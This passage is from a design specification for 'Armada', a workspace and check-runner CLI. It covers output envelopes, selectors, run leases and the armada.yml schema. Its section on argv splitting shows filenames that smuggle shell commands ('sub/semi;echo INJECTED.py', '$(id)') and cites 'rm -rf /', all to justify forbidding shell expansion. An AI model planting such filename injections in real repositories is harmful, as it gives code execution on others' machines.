workspace** as the reason, which is the thing an agent cannot work out for itself and the only
useful answer to "why has this taken fifteen minutes."''

#### Ports: `port_block` is the workspace's; assignments are the component's

<!-- doclint: skip — a fragment, deliberately, to show data without the envelope -->
```json
"data": {
  "port_block": { "from": 5460, "to": 5469, "claimed_at": "2026-08-09T14:02:11Z" },
  "results": [
    { "id": "postgres", "status": "UP",
      "ports": { "pg":  { "port": 5460, "state": "LISTENING" } } },
    { "id": "api", "status": "FAILED",
      "ports": { "api": { "port": 5461, "state": "CONFLICT" } },
      "error": { "class": "tool_failed",
                 "message": "port 5461 held by a process Armada did not start" } } ] }
```

`port_block` carries **only what Armada actually knows and owns**: the span reserved for this
workspace and when it was reserved. Not a count of assignments — that is derivable from
`results[]` and duplicating it invites drift. Not a count of free ports — Armada cannot know
that without probing every unassigned port, and the answer would be stale on emission. Naming
them `from` and `to` rather than a two-element array removes the "span or list?" ambiguity.

**Port state is probed at report time, never remembered.** A claim recorded at `init` says
nothing about what is bound days later, and the bindability probe has a measured blind spot:
**an IPv6-only listener is invisible to an IPv4 probe**, and `localhost` resolving to `::1` is
what modern Node does. So Armada probes **both** `127.0.0.1` and `[::1]` and treats either
`EADDRINUSE` as taken. `SO_REUSEPORT` on both sides remains undetectable and is a stated limit,
not a bug. An earlier draft named `SO_REUSEADDR` as the defeating case and cited
[`traps.md`](traps.md) for a measurement that was not there; `SO_REUSEADDR` does not defeat it. `CONFLICT` is the only way a port taken by a
non-Armada process reaches a caller instead of surfacing as a mysterious bind failure. It costs one `bind()` attempt per declared port, on both `127.0.0.1` and `[::1]` — **not a
`connect()`**, which answers the opposite question and reports a listening-but-idle socket as
free.

| State | Meaning |
|---|---|
| `RESERVED` | assigned to a component, nothing bound — expected after `init` or `down` |
| `LISTENING` | bound, by the service Armada started |
| `CONFLICT` | bound by something Armada did not start |

**`init`, `up`, `down` and `status` all emit `results[]`** — `init`'s are components, the rest
are services. That is what lets the two states with ports but no running services (`init`, and
`down` which keeps the block) report them without a second, duplicate top-level map.

### 3.1.1 The human render — three audiences, one envelope

`--json` is the machine contract and §3.1 specifies it. What it does not specify is the other
output, and "whatever `render.rs` happens to print" is not a specification.

**There are three audiences, not two.**

| Audience | Detected by | Gets |
|---|---|---|
| A person at a terminal | stdout is a TTY | Colour, aligned tables, progress |
| **An agent reading stdout** | stdout is not a TTY | The same structure, no ANSI, no progress, no redraw |
| A parser | `--json` | The envelope and nothing else |

**The middle row is the one that gets forgotten, and it is the common case here.** Agents call
this CLI constantly and most of them do not pass `--json` — they run `armada manifest status`
and read what comes back. Output that is only legible with colour is output an agent reads as
noise, and escape codes in a captured string are worse than noise. Non-TTY human output is a
first-class mode, not a degraded one: same columns, same order, same words, minus the styling.

**Progress goes to stderr. Always.** A spinner on stdout means `armada manifest check | jq`
receives frames of animation, and the one consumer the envelope exists for is the one that
breaks. Anything that redraws, animates or reports intermediate state is stderr; stdout carries
the result.

**Colour is decided once, in one place.** `--color auto|always|never`, defaulting to `auto`.
`auto` means colour when stdout is a TTY **and** `NO_COLOR` is unset. `NO_COLOR` is honoured
whatever its value — that is the standard, and arguing with it costs a bug report from someone
who set it deliberately.

**Truecolor is the target and there is no 16-colour fallback** — the palette is one page,
shared with the Bridge, and its two ambers collapse to the same yellow at 16 colours
([`commands/render.md`](commands/render.md)). Terminals that cannot do truecolor get the
no-colour path, which is a supported mode rather than a broken one.

**One renderer, not one per verb.** `render.rs` is already the single place human output is
produced, and it stays that way: a table helper, a status token helper and a palette, used by
every verb. The moment a verb formats its own output, two verbs disagree about what a column
is called.

### 3.2 Selectors

Check ids are derived as `<component>:<check>` (§4.1), so Armada always holds the complete set
of valid selectors and never has to discover anything. `armada manifest check web:e2e`,
`armada manifest check --component web` and `armada manifest check lint` all fall out of that set.

**A bare positional accepts four things, disambiguated by characters the name grammar
forbids** (§4.1: names match `^[a-z0-9][a-z0-9_-]*$`, so they contain no `:`, `/` or `.`):

```
armada manifest check api                        component, or a check name
armada manifest check lint                       check name across every component
armada manifest check api:lint                   a check id                        (has `:`)
armada manifest check backend/api/views.py       a path                            (has `/` or `.`)
armada manifest check backend/tests/             a path — directory
armada manifest check --files a.py b.py          an explicit list
```

**A path selector runs the checks whose `match:` covers those files, with `${files}` set to
exactly them.** That is the case an agent actually has — it changed one file and wants that
file checked. Without it an agent reasons that running the underlying tool directly is faster,
and it is right.

> **Armada cannot win on latency, and the requirement that it must was wrong.** An earlier draft
> said `armada manifest check <one file>` "must be at least as fast as running the tool by hand." It
> cannot be, and stating an unmeetable requirement instead of a mechanism is how a known risk
> gets treated as handled. **Measured floor, before Armada parses any YAML or spawns anything:**
>
> | | |
> |---|---:|
> | `git rev-parse --path-format=absolute --git-common-dir` | 12.7 ms |
> | `git merge-base` | 19.2 ms |
> | `git diff -z --name-only` | 17.3 ms |
> | `git status -z` | 15.0 ms |
> | SQLite open + WAL + `BEGIN IMMEDIATE` + commit | 0.8 ms |
> | **total** | **~65 ms** |
>
> **Decision: accepted.** 65 ms is below the threshold where anyone chooses differently — the
> tool it wraps takes hundreds of milliseconds on one file and seconds on a suite, so the
> overhead is noise against the work. The floor is recorded so it stays a floor: a phase that
> adds a sixth subprocess to the common path is spending from a budget, and should say so.
>
> **What actually prevents the bypass is not speed, it is not knowing the command.** The agent
> that would bypass `armada manifest check api/views.py` has to know the tool, its flags, the working
> directory it expects, the environment it needs, and which of the repo's four test runners
> owns that path. That is the knowledge Armada exists to remove, and an agent that has it did not
> need Armada for this repo in the first place. Speed only has to be *close enough not to
> motivate re-deriving all of that*, and 65 ms is.

**Contention does not make this worse, though it reads as if it might.** The run lease is
per-workspace, so five agents in five worktrees never contend on it — they contend on
cpu-slots and exclusives, which **queue** rather than refuse (§3.2.1). The only fail-fast is a
second `armada manifest check` in the *same* workspace, which is a genuine mistake worth reporting, and
its `next_action` names `--wait`.

**A bare word that matches both a component and a check name is `bad_invocation`**, naming both
and telling the caller to disambiguate with `--component`. Rare, and better than picking one
silently.

**Partial matches are normal.** `armada manifest check test` where `api:test` exists and `web:test` does
not runs `api:test` and exits 0.

**Zero matches depend on whether the name is conventional.** These four are conventional:

```
lint   types   test   e2e
```

They are the check names §4.1's example config uses, minus `build` — conventional in name but not in signal, since a failed build is not a failed lint. An earlier
draft listed six, adding `build` and `fmt`, and justified the set with *"all six fixtures
already use exactly these names"* — a claim about artifacts that do not exist yet, and one
that also broke the growth rule stated below. `build` and `fmt` join the set the first time a
fixture actually declares them.

- **A conventional name matching nothing** → `SKIPPED`, empty `data.results[]`, exit 0. Not
  `PASS`: the reason `SKIPPED` exists (§3.1) is that claiming approval when nothing ran is the
  failure mode, and that argument does not care whether the reason nothing ran was zero files
  or zero matching checks. "This
  workspace has no lint checks" is a real and unremarkable answer, and it is what lets an
  orchestrating agent run `armada manifest check lint` across five workspaces without special-casing
  the three that lack it.
- **An unconventional name matching nothing** → `bad_invocation`, exit 2, with the available
  selectors listed in `next_action`. Almost always a typo, and the error teaches the
  vocabulary rather than merely rejecting.

**Why Armada holds this small piece of policy.** Without it, "you typed it wrong" and "this
repo has none" are indistinguishable, and both available answers are bad: exiting 0 on a typo
means an agent reports a passing lint that never ran, while erroring on both teaches agents
to write `armada manifest check lint || true` — which suppresses *every* error the command can raise,
converting a local annoyance into a total loss of signal. The set is drawn from §4.1's example
config and nothing else; the fixtures do not exist yet and cannot justify anything.

**Growth rule: a name joins the set only when a fixture uses it.** Otherwise the list becomes
a bikeshed.

**`--fix` runs `fix:` instead of `cmd:`** for every selected check that declares one, and
skips those that do not. `fix:` was a config key with no flag to invoke it.

### 3.2.1 One run at a time, per workspace

A `armada manifest check` holds a **run lease** (§4.3) for its workspace. A second, non-nested `armada
check` **fails fast** rather than blocking:

```
error: a run is already in flight
  run 01J8X2, pid 4212, started 3m ago
class: bad_invocation                  exit 2
next_action: `armada manifest check --wait` to queue, or `armada manifest check --status` to watch it
```

Blocking by default would mean an agent expecting a quick lint silently waiting out a
fifteen-minute test suite with no output. Failing fast gives it something to act on;
`--wait` is there when queueing is what you meant.

**Nested runs join rather than contend — but only within the same workspace.** A child that
finds `ARMADA_RUN_ID` set (§2.4) joins the outer run and inherits its lease **if and only if
`ARMADA_WORKSPACE` equals the workspace it just resolved**. Otherwise it clears both variables and
starts an independent run.

That condition is load-bearing. §4.5 inherits the parent environment *wholesale*, so both
variables reach every child — including a `armada manifest check` invoked in a **different** workspace: a
nested workspace (§4.6), a `commands:` script that changes directory, a monorepo
sub-invocation. Without the workspace check such a child skips its own lease and reports the
parent's id, which allows two concurrent runs in one workspace — the exact thing this section
exists to prevent, failing only under nesting and therefore only rarely and
nondeterministically.

### 3.2.2 The envelope on error paths

The envelope shape never varies (§3.1), but two fields need stating for the case where Armada
failed before it could establish context:

- **`workspace` is `null`** when workspace resolution is what failed — a `bad_config` for a
  missing `armada.yml`, or any machine-scoped invocation run from outside a workspace (§2.1).
  A consumer must tolerate it; it cannot be "always the invoking workspace" when there isn't
  one.
- **`status` is `FAILED`** whenever `error` is non-null and no more specific terminal state
  applies. That includes `armada manifest status`, whose only success state is `OK` and which otherwise
  had no way to report that it failed.

### 3.3 Scope lens

`status` and `clean` are the two verbs where "just me" isn't always right. Same flag on both.

| Scope | Covers | Answers |
|-------|--------|---------|
| *(no flag)* | this checkout | "Are my services up? Is a run in flight? What ports do I hold?" |
| `--project` | every workspace sharing this `--git-common-dir` | "What's going on across everything I have open on this repo?" — the orchestrating agent's view |
| `--all` | every workspace on the machine | "What is Armada holding anywhere?" |

### 3.3.1 `--dry-run`

**`armada manifest init`, `armada manifest up`, `armada manifest down`, `armada manifest check` and `armada manifest clean` all take `--dry-run`.** It
returns the ordinary envelope with `data.would_*` in place of `data.results[]`, and changes
nothing:

```
armada manifest clean --dry-run --artifacts --all
  would_release   ports 5460-5469 (a3f91c02), 5470-5479 (7c21ab90)
  would_remove    4 containers, 3 networks, 2 images
  would_delete    node_modules, .venv            (--artifacts)
  would_report    1 external resource Armada does not reclaim (§6.1)
```

**Armada computes this from its own state and needs no help from the repo.** It knows what it
claimed, what it labelled, and what the current scope selects. `clean --artifacts --all` is the
case that most needs it — it deletes every declared `owns.files` on the machine and previously
had no preview at all.

**`commands:` entries take no `--dry-run`.** §4.5 passes remaining argv through **untouched**,
and its own example is `armada worktrees prune --dry-run` reaching the script unchanged — so a
`dry_run:` key would have Armada intercept a flag that belongs to the child. A dispatched
command's flags are the child's; `--dry-run` applies to the five verbs Armada owns.

Two filters compose with any scope, on `clean`:

- **`--orphaned`** — always safe. It only touches workspaces whose directory no longer exists,
  so it can never disturb a live agent.
- **`--artifacts`** — also removes declared `owns.files` (§6.1). Off by default because those
  cost disk but leak nothing machine-global, and removing them makes the next `init` pay a
  full reinstall. `armada manifest clean --artifacts --all` is the reclaim-disk answer; it is a no-op
  under `--orphaned`, where the files are already gone with the directory.

**`--all` takes a machine lease, not a workspace one**, because it runs from outside any
workspace and the per-workspace run lease has nothing to attach to — leaving the most
destructive operation in the tool as the only mutating verb with no lock. The machine lease is
one row in `leases` with a null workspace; it excludes another `--all` and nothing else.

**`--all` skips any workspace holding a live lease, and reports what it skipped.** `--all` is
every workspace on this machine, so on the five-concurrent-agents premise this project is built
around, the unguarded version stops four live stacks and deletes their `node_modules` while
their agents are mid-run. §3.3 already warns that `--project` "will stop other worktrees'
services — which is exactly why it is not the default"; `--all` is strictly broader and had no
such guard. The check is one query against `leases`, and skipping is right rather than
refusing: reclaiming disk from the eleven idle workspaces is still the thing you asked for.
`--force` overrides, because "I know, stop them" is a real intent.

`--project` on `clean` **will** stop other worktrees' services — which is exactly why it is
not the default.

---

### 3.4 `armada manifest explain` — the evidence a stack trace does not carry

**A failing check hands back an exit code and a stream, and the thing that makes it
actionable is everything *around* it that only Armada knows.** `armada manifest explain <check-id>` emits
that, as data. It runs no analysis, calls no model, touches no network, and mutates nothing.

```
armada manifest explain api:test          # a check id from any retained run
armada manifest explain                   # the most recent failure in this workspace
armada manifest explain --run 01J8X2      # a specific run, including a detached one
```

**Most of it the caller could get for itself, and being honest about which is which is what
makes this specifiable.** Three categories:

| Evidence | Recoverable by the caller? |
|---|---|
| cwd | **Yes, trivially** — §4.1 fixes it at the workspace root. A constant, not a discovery |
| env names, `env:` values | **Yes** — in the config; the inherited environment is the one it spawned Armada with |
| this run's log, and prior runs' logs | **Yes** — `results[].log`, and `.armada/run/<id>/logs/` is on disk |
| argv, post-substitution | **Only by reimplementing Armada** — substitution, the `${files}` set, and the argv split with quote handling |
| the failure signature | **Only by reimplementing Armada** — it must match the normalisation exactly or two runs of one bug stop matching |
| **leases held, what it waited on, who held it, how long** | **No.** Point-in-time state that no longer exists |
| **port bind state, daemon reachability at dispatch** | **No.** A probe now answers a different question than a probe then |

**So the argument is not that the caller cannot get this. It is two narrower things.**

**Armada writes it all down at dispatch — the model is `docker inspect`.** `inspect` can answer
everything about a container because the daemon recorded it at create time and kept it, not
because it recomputes anything on demand. `explain` is the same: a read of a record, never a
computation. Anything Armada knows at the moment it dispatches — and it knows all of it — is
cheap to write and impossible to recover afterwards.

**Impossible to recover is the point, not a limitation.** Query `manifest.db` an hour later and it
truthfully reports who holds the browser *now*, which is a different and useless answer to "what
was `web:e2e` waiting on when it timed out." The same for a port: the probe answers about this
instant. Live state answers a different question than the one being asked, so the record has to
be made at the time or not at all.

**Record the event sequence, not just a snapshot.** The scheduler is
`step(State, Event) -> (State, Vec<Action>)` over exhaustive enums (`ARCHITECTURE.md` §1.2), so
Armada already produces a complete ordered account of the run: every lease granted and denied,
every spawn, every deadline, every exit. Persisting that sequence gives `explain` something
`docker inspect` has no equivalent of — a trace that **replays through `step()`** to reproduce
exactly what the scheduler decided and why. The reducer was chosen for compile-time
exhaustiveness; this is the second dividend from the same decision, and it costs one append per
event.

> **Inherit `docker inspect`'s shape, not its mistake.** `inspect` dumps environment variable
> *values*, which is a well-known way secrets escape — and the compose form of it is measured in
> [`traps.md`](traps.md), where `config` inlines `.env` values into its output. The dispatch
> record carries environment **names only**, and the same scrubber that guards `results[].log`
> guards it (§4.7). A diagnosis channel that bypasses the scrubber would make `ARCHITECTURE.md` §1.8's invariant
> an invariant with an exception.

**A reconstruction that disagrees is worse than none.** An agent that reimplements the
substitution and the argv split produces a command it *believes* ran; if its quote handling
differs in one case, it diagnoses a command that never executed and nothing reveals the
divergence. The value here is authority — this is what actually ran — not availability.

**The dispatch record is written by the phase that dispatches, not by `explain`.** The verb is
a reader; the writing is phase 3 for checks and phase 4 for services, at the moment each one
runs. Sequencing it the other way — a phase-5 verb querying phases 2–4's state — reads an empty
record for everything in the third category above, which is the part worth having.

**The history row is the one that changes an agent's behaviour**, and it is nearly free because
the runs are already retained. "This check failed the same way in the last three runs, none of
which touched its files" and "this check passed twenty minutes ago and the only change since is
one file" are opposite problems, and a stack trace is identical in both.

**The failure signature is `(check_id, exit_code, blake3(normalised tail of output))`.**
Normalisation strips absolute paths, the workspace id, timings and pids — the things that differ
between two runs of the same failure. It is a fingerprint for *same or different*, never a
diagnosis, and it is deterministic so two runs of one bug always match.

**`explain` is a read verb, and the read-verb rule now covers three things**: `armada manifest status`,
`armada manifest check --status`, and `armada manifest explain`. They take no lease, they may report a progress state
in the envelope's top-level `status` where every other verb's is terminal, and **their exit code
describes the query, not the thing queried** — `0` for answered, `2` for an unknown run or check
id, `3` if the config no longer parses. A gate uses `--wait`; it never reads a query's exit code
as a verdict.

**Retention is the stated limit.** `run_retention` is 10, so explain answers about the last ten
runs and says plainly when a run has aged out rather than reporting thin evidence as complete.

> **Why this and not an agent inside Armada.** The obvious version of this feature shells out to
> whatever agent CLI is on `PATH` and prints prose. It is deliberately **not** what `explain`
> is, and the reasoning is in §7 — the short version is that Armada's caller is already an agent,
> and the useful thing Armada can do is give that agent what it cannot see rather than run a
> second, worse one with no context.

---

## 4. Configuration

### 4.1 `armada.yml` — committed

**One section per module, and only `manifest:` exists.** Every key below lives under it, and
the top level of the file holds nothing else. Nesting from the start is the whole reason M1
touched this file at all: Guild is machine-global and will never appear here
([`ARCHITECTURE.md`](ARCHITECTURE.md) §1.9), but Fleet's repo-level defaults might, and the
alternative to nesting now is re-indenting every config in the world at that point
([`PHASES.md`](PHASES.md) §8.3). A document with no `manifest:` section is `bad_config`, and
so is a top-level key beside it.

Key paths in a `bad_config`'s `where` carry the section, because a locator that names a key
which is not in the file is worse than no locator: `armada.yml:manifest.components.api.checks.lint.cmd`
(§3.1, §4.1.1 decision 4).

**Defaults, because an unstated default is a per-implementer decision.** `version: 1` is
required — a config with no version is `bad_config`, since the whole point of the key is to
exist before it is needed. `cost:` defaults to **1**. `scope:` defaults to **file**.
`shell:` defaults to **false**. `check.timeout:` defaults to **900 seconds**, overridable
per check and machine-wide as `check_timeout` in `~/.armada/machine.yml` (§4.3.1) — a check with
no deadline is a hung merge gate, so the default is a real number rather than "none".
`ready.timeout:` defaults to 60 (§6.0).

**One `components:` mapping.** A component is a named thing that may have source to check
(`checks:`), a process to run (`run:`), or both. Do not split these into separate `units:`
and `services:` blocks — they are two *axes*, not two kinds of thing, and splitting them
makes the both-axes case (an API server) read as duplication.

```yaml
manifest:
  version: 1

  components:

    # runs only — not your source
    postgres:
      run:
        driver: compose
        file: [docker-compose.yml]   # a list — repos often run base + override
        ports: { pg: 5432 }          # remapped into this workspace's block (§6.0)

    # BOTH axes
    api:
      root: services/api           # must stay inside the workspace root (§5)
      match: ["backend/**"]        # scoping by changed files
      setup: uv sync               # what `armada manifest init` runs
      run:
        driver: command
        cmd: manage.py runserver 0.0.0.0:${port.api}
        ports: { api: 8000 }
        ready: { http: "http://127.0.0.1:${port.api}/healthz" }
        needs: [postgres]
        env: { DJANGO_SETTINGS_MODULE: app.settings.dev }
        stop: ./scripts/graceful-stop.sh    # optional; default is killpg
      checks:
        lint:
          cmd: ruff check ${files}
          fix: ruff check --fix ${files}
          timeout: 120
        types: { cmd: mypy . }
        test:
          in: api                  # runs inside api's container (§4.1)
          cmd: pytest ${files}
          env: { DJANGO_SETTINGS_MODULE: app.settings.test }
          timeout: 600
          cost: 4                  # CPU slots, machine-wide (§4.3)
          needs: [postgres]

    # checks only — a library, never runs
    web:
      root: web
      match: ["web/**"]
      setup: pnpm install --frozen-lockfile
      owns:                        # component level — what setup: created (§6.1)
        files: [node_modules]      # removed only by `clean --artifacts`
      checks:
        lint:  { cmd: "pnpm eslint ${files}", fix: "pnpm eslint --fix ${files}" }
        types: { cmd: pnpm typecheck }
        test:  { cmd: pnpm vitest run, cost: 2 }
        e2e:
          cmd: pnpm e2e
          scope: component         # never file-scoped
          timeout: 900
          cost: 4
          exclusive: [browser]     # machine-wide mutex, never shared (§4.3)
          needs: []                # boots its own servers — see §4.4
```

#### Six things the above example uses and an earlier draft never defined

**`${port.NAME}` is a single workspace-global namespace**, not per-component. A component may
reference another's port — `multi-lang`'s Rust worker builds `CONTROL_URL` from the Elixir
service's `${port.http}` — which is the ordinary case whenever two services talk to each other.
The cost is that **two components may not declare the same port name**; `config verify` rejects
it, because `${port.http}` would otherwise be ambiguous with no diagnostic.

**`ports: { pg: 5432 }`** — the name maps to the port **the service itself listens on**.
Armada claims a host port from this workspace's block and maps it. `${port.pg}` always resolves
to the **host** port, because that is the one anything outside the container must connect to.
For `driver: command` there is no mapping layer: the claimed host port *is* the port, and the
command is expected to bind it.

**Port blocks are claimed, then verified bindable.** The database (§4.3) records only what
*Armada* has claimed — it knows nothing about an unrelated dev server already sitting on 5460.
So `init` attempts to bind each port in a candidate block before claiming it, and picks
another block if any is taken. Block size is configurable; its default is a convention, not
a measurement.

**`scope:`** takes `file` (the default) or `component`. `file` means the check receives
`${files}`; `component` means it always runs over the whole component, which is what
`web:e2e` needs — an end-to-end suite scoped to two changed files tests nothing. **A
`scope: component` check containing `${files}` is `bad_config`**, not a silent empty
expansion: the two say opposite things, and quietly honouring one of them is how you get a
suite that appears to run and covers nothing.

**Every check runs from the workspace root, and `${files}` paths are workspace-relative.**
One base for everything — cwd, `${files}`, and `match:` globs all agree. This was undefined in
an earlier draft, and it is the most-referenced undefined fact in the schema: two readings give
two configs that both validate and one of which never runs.

Workspace-relative because **the primary consumer is an agent reading output and editing
files.** `backend/app/views.py:12` is directly actionable; `app/views.py:12` has to be prefixed
first, and the agent has to know by how much. The cost — commands carrying `--dir`, `--filter`
or `-C` flags — is already being paid: every fixture writes them, because that is how these
tools are normally driven in a monorepo.

**`root:` is not a working directory.** It says where a component's source lives: it scopes
`match:` and resolves executables for `config verify`. §7 reserves it to point *outside* the
workspace for multi-repo, so overloading it with a second meaning would collide with that.

#### How a `cmd:` is executed, and `setup:` idempotence

**Every `cmd:`, `fix:`, `stop:` and `setup:` step is argv-split by default — no shell.** Armada
splits on whitespace respecting quotes, and substitutes `${files}` as **separate argv
elements**.

**The reason is a trust boundary, and an earlier draft of this paragraph had it backwards.**
`armada.yml` is *fully trusted* — you cloned the repo and ran Armada against it, and `cmd: rm -rf /`
needs no metacharacter to be destructive. Argv-splitting buys nothing there. It matters for the
values that cross a boundary **into** a command:

| Value | Comes from | Trusted? |
|---|---|---|
| `cmd:` itself | the config author | yes — running Armada is the trust decision |
| **`${files}`** | **filenames on the branch being checked** | **no** |
| `${ref}` | the config, into a provider command | treated as untrusted (§4.7 rule 1) |

**`${files}` is the dangerous one, and it is measured, not theoretical.** A filename may contain
`;`, `$(…)` or a quote — POSIX permits it, git emits it raw under `-z`, and under a shell it
executes:

```
sub/semi;echo INJECTED.py   →  ;echo INJECTED   runs as a separate command
sub/dollar$(id).py          →  $(id)            runs, and its output is substituted
```

Anyone who can push a branch to a repo using Armada then has **arbitrary code execution on every
machine that runs `armada manifest check` on it** — the verb agents call most.

> **`shell: true` combined with `${files}` is rejected by the schema.** Not a warning, not a
> `config verify` check, not a runtime guard: unrepresentable. A warning is advice, and this is
> the difference between a config being wrong and a machine being owned.

**`${files}` must stand alone as a whole token.** `ruff check ${files}` is legal;
`ruff check --stdin-filename=${files}` is `bad_config`. The placeholder expands to *n*
arguments, and *n* arguments cannot be pasted inside one — a schema-checkable rule that
removes the only case where the expansion has no meaning.

**Armada reads the file list NUL-delimited and never splits it itself** — `git diff -z`, `git
ls-files -z`, `git status -z`. Newline is a legal character in a POSIX filename, so a
line-oriented read of git's output turns one file into two nonexistent ones. Because argv
carries the values with no re-parsing, a filename with a newline in it survives end to end.

Under a shell, `${files}` is also word-split, so a filename containing a space silently becomes
two arguments — the same substitution failing quietly even without malice.

**`shell: true` opts a single entry into shell interpretation**, where `|| true`, pipes,
redirection and inline assignments all work:

```yaml
setup:
  - bundle install
  - { cmd: "createdb app_${workspace.id} || true", shell: true }
  - bundle exec rails db:migrate
```

It is per-entry and visible in the diff, so a reviewer can see exactly where shell semantics
are live. **`shell: true` is never permitted on `secret_providers[].cmd`** (§4.7 rule 1 exists
to keep `${ref}` out of a shell), and never in an entry using `${files}` — the schema forbids
both combinations outright.

**`shell: true` is not a security boundary and must not be described as one.** It is an
ergonomic escape for `|| true` and pipes in a config you already trust.

**`armada manifest init` is idempotent with respect to Armada's own state**, and that is the whole claim: one
port block per workspace id, `.armada/` recreated, one row in `manifest.db`. **Whether re-running a
`setup:` step is safe is a property of the repo's commands.** A step that errors when its
resource already exists is the repo's to make tolerant — `|| true` under `shell: true`, or a
tool's own idempotent flag. A step that *succeeds* and does the wrong thing twice, like a seed
that duplicates rows, is a property of that command that a human re-running it by hand hits
identically; Armada does not try to fix it, and an earlier draft's per-step `once:` marker was
removed for exactly that reason.

#### `needs:` on a check takes components *and* check ids

```yaml
core:
  checks:
    build: { cmd: "pnpm --filter @acme/core build", scope: component }
ui:
  checks:
    types:
      cmd: "pnpm --filter @acme/ui typecheck"
      needs: [core:build]          # a check id — must PASS before this starts
    test:
      cmd: "pnpm --filter @acme/ui vitest run ${files}"
      needs: [postgres]            # a component — the service must be running
```

**The two forms are told apart by the colon**, which is why check ids are derived as
`<component>:<check>` and why a component name may never contain one.

| `needs:` entry | Means | If unsatisfied |
|---|---|---|
| a **component** (`postgres`) | the service must be running | Armada starts it (phase 4) |
| a **check id** (`core:build`) | that check must have **passed** in this run | see below |

Four semantics, because leaving any of them to the implementer produces four different tools:

- **A named check is pulled into the run even if the selector did not select it.** `armada manifest check
  ui:types` runs `core:build` first. Selecting a check selects its prerequisites; anything else
  makes the selector silently produce a broken run.
- **If a prerequisite fails, its dependents do not run** and are reported `ABORTED` with a
  message naming the failed check. They are not `FAILED` — they were never attempted, and an
  agent must not go looking for their output.

  **A cascaded `ABORTED` never sets `error.class`.** Per-check status and the run's error
  class are separate channels (§3.1), and the run's class comes from *why the run ended*: a
  prerequisite that failed its own tests ends the run at `tool_failed`, exit 1. Letting the
  cascade set `aborted` would exit 5 — the retryable class — for a deterministic test failure,
  telling a merge gate to try again on a bug that will fail identically forever. `aborted` is
  reserved for the run being stopped from outside it: SIGINT, or the acquisition ceiling.
- **Cycles are a `bad_config`, caught statically by `config verify`.** They are unrepresentable
  at runtime, so they must be rejected before one.
- **Ordering does not imply exclusivity.** Two checks that both need `core:build` still run
  concurrently once it passes, subject to the cost budget.

> **This is ordering, and deliberately nothing more.** §7 rules out a build DAG with caching —
> content hashing, output tracking, cache restore, staleness — and that line does not move. Armada
> knows *"`ui:types` runs after `core:build` passes"*; it does not know what `core:build`
> produced, whether the output changed, or whether it could have been skipped. **The moment Armada
> asks whether a prerequisite's output is stale, it has become turbo, badly.**
>
> Honest risk, recorded because [`PHASES.md`](PHASES.md) §8.1's `pnpm-monorepo` fixture exists to ask this exact
> question: ordering is the first step of the slope §7 names. It was added because inter-check
> ordering is real and common — `ui:types` genuinely cannot run before `core:build` — and
> because the scheduler already holds an ordering graph for `needs:` against components, so this
> is an edge in a graph that exists rather than a new subsystem. A repo that wants caching still
> delegates: `cmd: turbo run build --filter=@acme/core` gets turbo's graph inside Armada's
> scheduling.

**`checks:` take `env:`, with the same rules as `run:` and `commands:`.** Literals plus the
four substitutions, `${env.NAME}` reads permitted (§4.4), and the parent environment inherited
and layered underneath.

An earlier draft gave `env:` to `run:` and `commands:` and not to `checks:`, which reads as an
oversight rather than a decision — all three spawn a process, and no rationale anywhere defended
the exclusion. It bites nearly every real repo: `MIX_ENV=test`, `DJANGO_SETTINGS_MODULE`,
`RAILS_ENV=test`, `NODE_ENV=test`. The available workarounds all leak — prefixing `cmd` with an
assignment requires `cmd` to be shell-interpreted, which nothing states and §4.7 rule 1
deliberately avoids elsewhere; putting it in `run.env:` is the wrong scope and impossible for a
component with no `run:` at all, which `python-ml` has three of.

#### `in:` — running a check inside a container

```yaml
components:
  api:
    run: { driver: compose, file: [docker-compose.yml, docker-compose.dev.yml] }
    checks:
      test:
        in: api                    # the compose *service* named `api`
        cmd: pytest ${files}
```

Armada builds the `docker compose … exec -T` invocation itself, from **the file list and project
name it already owns**. Without this the only way to express it is to write the whole command by
hand — which duplicates `run.file:`, is easy to get subtly wrong (omit `-T` and it allocates a
TTY and hangs in CI), and, worst, hardcodes `armada-${workspace.id}`. That is §6.0's *internal*
naming convention; every config depending on it would freeze a private implementation detail.

**`in:` names a compose service, not a component.** A component's compose files routinely
define several services — `api`, `worker`, `migrate` — and `docker compose exec` needs one of
them, so a component name would leave Armada guessing. The service must be defined by the
**enclosing** component's `run.file:` list, which `config verify` checks against the resolved
document (§6.0 step 1) — so a typo'd or deleted service is a `bad_config` in pass 1 rather
than an exec failure at runtime. That the example reads `in: api` under component `api` is the
common case, not the rule.

Two consequences: the enclosing component must be `driver: compose`, and `in:` **implies
`needs:`** on it — the container has to be running, which per phase 4 means Armada starts it.

**A check with `in:` may not be granted `secrets:`.** It is `bad_config`, because the only way
to hand a value to an exec'd process is `docker compose exec -e KEY=value`, which puts the
value **in argv** — readable by anyone who can run `ps` on the host, and recorded in the
daemon's exec inspect. That violates `ARCHITECTURE.md` §1.8 outright. A container's environment is compose's
job: the service already has what it needs from the `environment:` the repo declared.

**Armada passes the same workspace-relative paths and sets the working directory to the mount
point.** It cannot verify that the repo's bind-mount matches — but a single stated convention is
exactly what lets a repo set its mount up correctly.

**`${files}` is the set of files changed against the merge-base with the default branch,
plus uncommitted working-tree changes.** And the case that matters:

> **If the set is empty, the check is skipped — it is never invoked with no arguments.**

**Skipped is `SKIPPED`, a terminal state that maps to exit 0 and does not make a run
`PARTIAL`.** It needs its own token: `PASS` would claim the tool ran and approved, and
`ABORTED` would claim something went wrong. Nothing went wrong — there was nothing to check.
`results[]` carries `{"status": "SKIPPED", "reason": "no matching files"}` so an agent that
expected a check to run can tell "no files matched" from "never selected".

This is not a nicety. `ruff check` with no paths checks the entire tree; a file-scoped check
that silently degrades into a full-tree run turns a three-second lint into a several-minute
one, and does it precisely when nothing needed checking.

**`armada manifest check --all-files` is how you ask for the whole tree, and it is not optional.** Without
it the diff-based default has a hole that points the wrong way: on the default branch with a
clean tree the changed set is empty, every file-scoped check reports `SKIPPED`, and `armada manifest check`
exits **0** having verified nothing. That is a merge gate that approves everything — the worst
possible failure for the verb this project exists to make trustworthy. It also bites on a fresh
clone, on a detached HEAD, and under a CI shallow clone where the merge-base does not exist.

`--all-files` sets `${files}` from each component's `match:` globs instead of from the diff.
Where the merge-base cannot be computed at all, Armada does **not** silently fall back to it —
that would be the same hole with an extra step. It fails `bad_invocation` naming the missing
base and telling the caller to pass `--all-files`.

Check ids are **derived** as `<component>:<check>` — `api:lint`, `web:e2e`. Never written by
hand, so they cannot drift, collide, or be typo'd.

**`:` is reserved.** Component and check names match `^[a-z0-9][a-z0-9_-]*$` and may never
contain a colon. That is what makes a derived id unambiguous, and it is now load-bearing in a
second place: `needs:` tells a component from a check id by the colon alone (below). Selectors that fall out for free:
